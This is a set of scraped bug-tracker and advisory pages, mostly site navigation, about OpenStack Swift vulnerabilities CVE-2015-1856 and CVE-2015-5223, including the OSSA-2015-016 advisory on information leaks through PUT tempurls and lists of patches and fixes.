Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/swift/%2Bbug/1453948/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [400 PUT tempurls that have a x-object-manifest header](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4418957/%2Bfiles/fix-tempurl-dlo-surprise.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4418957 "Change patch details")
* [fix-tempurl-for-clayg.diff](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433373/%2Bfiles/fix-tempurl-for-clayg.diff)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433373 "Change patch details")
* [fix-patch-for-kota.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433396/%2Bfiles/fix-patch-for-kota.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433396 "Change patch details")
* [tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435635/%2Bfiles/tempurl.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435635 "Change patch details")
* [juno-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435840/%2Bfiles/juno-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435840 "Change patch details")
* [kilo-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435842/%2Bfiles/kilo-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435842 "Change patch details")

* [Add patch](/swift/%2Bbug/1453948/%2Baddcomment?field.patch=on)

## Bug attachments

* [show how to use any PUT tempurl to probe for object/container existance](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4395824/%2Bfiles/put-tempurl-dlo-leak.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4395824 "Change attachment details")
* [anc-tempurl-dlo-POST-regression](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439702/%2Bfiles/anc-tempurl-dlo-POST-regression)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439702 "Change attachment details")
* [anc-tempurl-dlo-POST-test](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439705/%2Bfiles/anc-tempurl-dlo-POST-test)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439705 "Change attachment details")

* [Add attachment](/swift/%2Bbug/1453948/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from www.redhat.com_631761e0_20250126_062851.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from review.openstack.org_c62792b1_20250126_062833.html ===




=== Content from review.openstack.org_78435665_20250126_062901.html ===




=== Content from bugzilla.suse.com_febb6dc6_20250126_062855.html ===


| Bugzilla – Bug 927793 | VUL-1: CVE-2015-1856: openstack-swift: OpenStack Object Storage (Swift) before 2.3.0, when allow\_version is configured,allows remote authe... | Last modified: 2016-04-27 20:20:11 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D927793)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 927793**](show_bug.cgi?id=927793)
(CVE-2015-1856)
- VUL-1: CVE-2015-1856: openstack-swift: OpenStack Object Storage (Swift) before 2.3.0, when allow\_version is configured,allows remote authe...

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-1: CVE-2015-1856: openstack-swift: OpenStack Object Storage (Swift) befor...

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-1856 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P4 - Low **Severity**: Normal | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <https://smash.suse.de/issue/115823/> | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv2:NVD:CVE-2015-1856:5.5:(AV:N/AC... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2015-04-20 09:28 UTC by Andreas Stieger | | --- | --- | | Modified: | 2016-04-27 20:20 UTC ([History](show_activity.cgi?id=927793)) | | CC List: | 4 users (show)  cloud-bugs jsuchome smash\_bz vuntz | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | Security Response Team | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=927793) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=927793&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=927793&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=927793#c0)  Andreas Stieger   2015-04-20 09:28:26 UTC  ``` CVE-2015-1856  OpenStack Object Storage (Swift) before 2.3.0, when allow_version is configured, allows remote authenticated users to delete the latest version of an object by leveraging listing access to the x-versions-location container.  References: <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1856> <http://seclists.org/oss-sec/2015/q2/136> <http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1856.html> <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1856> <http://www.cvedetails.com/cve/CVE-2015-1856/> [https://bugs.launchpad.net/swift/+bug/1430645](https://bugs.launchpad.net/swift/%2Bbug/1430645) <http://lists.openstack.org/pipermail/openstack-announce/2015-April/000349.html> ``` [Comment 2](show_bug.cgi?id=927793#c2)  Swamp Workflow Management   2015-04-20 22:00:41 UTC  ``` bugbot adjusting priority ``` [Comment 3](show_bug.cgi?id=927793#c3)  Vincent Untz   2015-10-16 23:17:38 UTC  ``` Submitted in mr#74926. ``` [Comment 4](show_bug.cgi?id=927793#c4)  Swamp Workflow Management   2015-10-30 11:10:13 UTC  ``` SUSE-SU-2015:1846-1: An update that fixes three vulnerabilities is now available.  Category: security (important) Bug References: 900253,927793,942641 CVE References: CVE-2014-7960,CVE-2015-1856,CVE-2015-5223 Sources used: SUSE OpenStack Cloud 5 (src):    openstack-swift-2.1.0-11.1, openstack-swift-doc-2.1.0-11.1 ``` [Comment 5](show_bug.cgi?id=927793#c5)  Marcus Meissner   2016-02-10 07:36:57 UTC  ``` reeased ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=927793)
* - [XML](show_bug.cgi?ctype=xml&id=927793)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=927793)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D927793)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from www.openwall.com_6a1f31e0_20250125_055204.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <55DE2018.50600@redhat.com>
Date: Wed, 26 Aug 2015 20:22:48 +0000
From: Tristan Cacqueray <tdecacqu@...hat.com>
To: oss-security@...ts.openwall.com
Subject: [OSSA 2015-016] Information leak via Swift tempurls (CVE-2015-5223)

==================================================
OSSA-2015-016: Information leak via Swift tempurls
==================================================

:Date: August 26, 2015
:CVE: CVE-2015-5223

Affects
~~~~~~~
- Swift: versions through 2.3.0

Description
~~~~~~~~~~~
Richard Hawkins from Rackspace and Swift core reviewers reported a
vulnerability in Swift tempurls. When in possession of a tempurl key
authorized for PUT, a malicious actor may retrieve other objects in
the same Swift account (tenant). All Swift setups are affected.

Patches
~~~~~~~
- <https://review.openstack.org/217253> (Juno)
- <https://review.openstack.org/217254> (Kilo)
- <https://review.openstack.org/217255> (Kilo)
- <https://review.openstack.org/217259> (Liberty)
- <https://review.openstack.org/217260> (Liberty)

Credits
~~~~~~~
- Richard Hawkins from Rackspace (CVE-2015-5223)
- Swift core reviewers from OpenStack (CVE-2015-5223)

References
~~~~~~~~~~
- <https://launchpad.net/bugs/1453948>
- <https://launchpad.net/bugs/1449212>
- <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5223>

Notes
~~~~~
- This fix will be included in future 2014.2.4 (juno) and 2015.1.2 (kilo)
  releases.

--
Tristan Cacqueray
OpenStack Vulnerability Management Team

Download attachment "[signature.asc](5/1)" of type "application/pgp-signature" (474 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from rhn.redhat.com_f571163a_20250125_055204.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
